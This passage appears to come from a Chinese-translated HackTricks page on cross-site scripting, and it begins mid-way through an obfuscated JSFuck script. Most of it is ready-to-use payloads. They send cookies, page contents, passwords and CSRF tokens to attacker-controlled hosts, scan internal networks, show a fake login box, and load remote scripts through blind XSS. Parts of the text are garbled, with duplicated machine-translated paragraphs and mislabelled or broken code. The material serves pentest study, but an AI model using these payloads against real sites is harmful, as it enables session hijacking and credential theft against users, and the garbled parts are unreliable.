]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>

```javascript
//aaencode
# XSS (跨站脚本攻击)

XSS（跨站脚本攻击）是一种利用网页应用程序中的漏洞，向用户注入恶意脚本的攻击技术。攻击者可以通过在受害者浏览器中执行恶意脚本来窃取用户信息、劫持会话、篡改网页内容等。

## 类型

### 存储型 XSS

存储型 XSS 是将恶意脚本存储在目标网站的数据库中，当用户访问包含恶意脚本的页面时，脚本会从数据库中提取并执行。

### 反射型 XSS

反射型 XSS 是将恶意脚本作为参数附加在 URL 中，当用户点击包含恶意脚本的链接时，脚本会被注入到目标网页中并执行。

### DOM 型 XSS

DOM 型 XSS 是通过修改网页的 DOM 结构来触发恶意脚本的执行。攻击者通过修改 URL 或表单提交等方式，使得网页的 DOM 结构发生变化，从而执行恶意脚本。

## 防御措施

- 输入验证：对用户输入的数据进行验证和过滤，确保只接受合法的数据。
- 输出编码：在将用户输入的数据输出到网页时，使用适当的编码方式，防止恶意脚本的执行。
- CSP（内容安全策略）：通过设置合适的 CSP 策略，限制网页中可以执行的脚本来源，减少 XSS 攻击的风险。
- 更新和修补：及时更新和修补网页应用程序中的漏洞，以防止攻击者利用已知漏洞进行 XSS 攻击。

更多关于 XSS 的详细信息，请参考[这里](https://www.example.com/xss)。

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS常见的有效载荷

### 多个有效载荷合集

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### 检索Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
如果cookie中设置了HTTPOnly标志，您将无法从JavaScript中访问cookie。但是，如果您足够幸运，您可以通过[一些方法绕过此保护](../hacking-with-cookies/#httponly)。
{% endhint %}

### 窃取页面内容
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### 查找内部IP地址

To find internal IP addresses, you can use various techniques:

#### 1. DNS Rebinding

DNS rebinding is a technique that allows an attacker to bypass the same-origin policy and access internal IP addresses. By setting up a malicious website and manipulating DNS responses, an attacker can trick the victim's browser into making requests to internal IP addresses.

#### 2. Server-Side Request Forgery (SSRF)

SSRF is a vulnerability that allows an attacker to make requests from the server to internal IP addresses. By exploiting this vulnerability, an attacker can retrieve internal IP addresses and potentially access sensitive information or services.

#### 3. Cross-Site Scripting (XSS)

XSS vulnerabilities can be used to execute malicious scripts in a victim's browser. By injecting a script that makes requests to internal IP addresses, an attacker can obtain the internal IP addresses.

#### 4. Network Scanning

Network scanning tools like Nmap can be used to scan for live hosts on a network. By scanning the internal network, an attacker can identify the internal IP addresses of the hosts.

#### 5. Social Engineering

Social engineering techniques can be used to trick employees into revealing internal IP addresses. By posing as a trusted individual or using pretexting techniques, an attacker can manipulate employees into providing sensitive information.

Remember to always obtain proper authorization before performing any activities related to finding internal IP addresses.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### 端口扫描器 (fetch)

The `fetch` method is a technique used in cross-site scripting (XSS) attacks to scan for open ports on a target system. It works by injecting malicious code into a vulnerable web application, which then sends requests to different ports on the target system. If a response is received, it indicates that the port is open and potentially vulnerable to further exploitation.

To perform a port scan using the `fetch` method, an attacker typically crafts a payload that includes JavaScript code to initiate the scan. This code uses the `fetch` function to send requests to a range of ports, such as 1 to 65535. The response from each request is analyzed to determine if the port is open or closed.

It's important to note that port scanning is a potentially intrusive activity and may be illegal or against the terms of service of certain systems. Always ensure that you have proper authorization and legal permission before conducting any port scanning activities.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### 端口扫描器（WebSockets）

This technique allows you to scan for open ports using WebSockets. WebSockets is a communication protocol that provides full-duplex communication channels over a single TCP connection. By leveraging this protocol, you can send requests to different ports and analyze the responses to determine if the port is open or closed.

To perform a port scan using WebSockets, follow these steps:

1. Identify the target: Determine the IP address or domain name of the target system you want to scan.

2. Set up a WebSocket connection: Use a WebSocket client to establish a connection with the target system. This can be done using various programming languages or tools that support WebSocket communication.

3. Send requests to different ports: Send WebSocket messages to the target system, specifying different port numbers in the requests. For example, you can send a message to port 80 to check if it is open.

4. Analyze the responses: Examine the responses received from the target system. If a response is received, it indicates that the port is open. If no response is received or an error message is returned, it suggests that the port is closed.

By systematically sending requests to different ports and analyzing the responses, you can identify open ports on the target system. This information can be valuable for further penetration testing or vulnerability assessment.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_短时间表示有响应的端口_ _较长时间表示无响应_.

在Chrome中查看被禁止的端口列表[**这里**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc)，在Firefox中查看[**这里**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)。

### 用于请求凭据的框
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### 自动填充密码捕获

Auto-fill passwords capture is a technique used to exploit cross-site scripting (XSS) vulnerabilities in web applications. When a user's browser has the auto-fill feature enabled, it automatically fills in saved usernames and passwords on login forms. 

攻击者可以利用自动填充密码捕获技术来利用Web应用程序中的跨站脚本（XSS）漏洞。当用户的浏览器启用了自动填充功能时，它会自动填充登录表单上保存的用户名和密码。

By injecting malicious code into a vulnerable web page, an attacker can trick the browser into capturing the auto-filled passwords and sending them to a remote server controlled by the attacker. This allows the attacker to obtain sensitive login credentials without the user's knowledge.

通过向易受攻击的网页注入恶意代码，攻击者可以欺骗浏览器捕获自动填充的密码并将其发送到由攻击者控制的远程服务器。这使得攻击者可以在用户不知情的情况下获取敏感的登录凭据。

To perform an auto-fill passwords capture attack, an attacker typically needs to find a web page that is vulnerable to XSS and has the auto-fill feature enabled. The attacker then injects malicious code into the page, which can be done through various methods such as input fields, URL parameters, or script tags.

要执行自动填充密码捕获攻击，攻击者通常需要找到一个易受XSS攻击的网页，并启用自动填充功能。然后，攻击者通过各种方法（如输入字段、URL参数或脚本标签）向页面注入恶意代码。

To protect against auto-fill passwords capture attacks, web developers should implement proper input validation and output encoding to prevent XSS vulnerabilities. Users can also protect themselves by disabling the auto-fill feature in their browser settings and being cautious when entering login credentials on unfamiliar or suspicious websites.

为了防止自动填充密码捕获攻击，Web开发人员应该实施适当的输入验证和输出编码，以防止XSS漏洞。用户还可以通过在浏览器设置中禁用自动填充功能，并在输入登录凭据时对陌生或可疑的网站保持警惕来保护自己。
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
当在密码字段中输入任何数据时，用户名和密码将被发送到攻击者的服务器，即使客户端选择了保存的密码并且没有输入任何内容，凭据也将被窃取。

### 键盘记录器

在GitHub上搜索，我找到了几个不同的键盘记录器：

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* 您还可以使用Metasploit的`http_javascript_keylogger`

### 窃取CSRF令牌
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### 盗取 PostMessage 消息

PostMessage 是一种在不同窗口或框架之间进行跨域通信的方法。攻击者可以利用这种通信方式来窃取敏感信息。

#### 攻击原理

攻击者可以通过注入恶意脚本来劫持目标网站上的 PostMessage 通信。一旦用户在目标网站上执行了恶意脚本，攻击者就可以监听和截取通过 PostMessage 发送的消息。

#### 攻击步骤

1. 攻击者在目标网站上注入恶意脚本。
2. 恶意脚本监听 PostMessage 事件，并截取发送的消息。
3. 攻击者获取截取的消息，包括敏感信息。

#### 防御措施

为了防止 PostMessage 消息被窃取，可以采取以下措施：

- 对于接收 PostMessage 消息的窗口，应该验证消息的来源，只接受来自可信源的消息。
- 在发送敏感信息之前，应该对消息进行加密。
- 避免在 PostMessage 消息中包含敏感信息，尽量使用其他安全的通信方式。

#### 相关链接

- [PostMessage - MDN Web 文档](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage)
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### 滥用服务工作者

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### 多语言

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### 盲目 XSS 负载

您还可以使用：[https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### 查找隐藏内容

从[**这篇文章**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)可以了解到，即使某些值在JS中消失了，仍然可以在不同对象的JS属性中找到它们。例如，即使正则表达式的输入值被删除，仍然可以找到它的输入值：
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### 暴力破解列表

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## 滥用其他漏洞的XSS

### Markdown中的XSS

可以注入Markdown代码来渲染吗？也许你可以获得XSS！请检查：

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS到SSRF

在使用缓存的网站上获得XSS？尝试使用以下有效负载将其升级为SSRF，通过边缘包含注入（Edge Side Include Injection）：
```python
<esi:include src="http://yoursite.com/capture" />
```
使用它来绕过cookie限制、XSS过滤器等等！
有关此技术的更多信息，请参见：[**XSLT**](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)。

### 动态创建PDF中的XSS

如果一个网页使用用户可控输入来创建PDF，您可以尝试欺骗创建PDF的机器人执行任意的JS代码。
因此，如果**PDF创建机器人发现**某种**HTML标签**，它将对其进行**解释**，您可以**滥用**这种行为来引发**服务器XSS**。

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

如果无法注入HTML标签，可以尝试**注入PDF数据**：

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### Amp4Email中的XSS

AMP是一种以开发移动客户端上超快速网页而闻名的技术。**AMP是由JavaScript支持的一组HTML标签**，它可以轻松实现功能，并且更注重性能和安全性。有各种[AMP组件](https://amp.dev/documentation/components/?format=websites)，从旋转木马到响应式表单元素，再到从远程端点检索新内容。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/)格式提供了[一组AMP组件的子集](https://github.com/ampproject/amphtml/blob/master/docs/spec/email/amp-email-components.md)，您可以在电子邮件中使用它们。接收AMP电子邮件的收件人可以直接在电子邮件中查看和与AMP组件交互。

示例：[**在Gmail中的Amp4Email中的XSS漏洞**](https://adico.me/post/xss-in-gmail-s-amp4email)。

### XSS上传文件（svg）

上传一个像下面这样的文件作为图像（来自[http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）：
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
在[https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)中找到更多的SVG负载。

## 杂项JS技巧和相关信息

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## XSS资源

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

### XSS工具

在这里找到一些[**XSS工具**](xss-tools.md)**。**

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**赏金猎人提示**：**注册**Intigriti，一个由黑客创建的高级**赏金猎人平台**！立即加入我们的[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
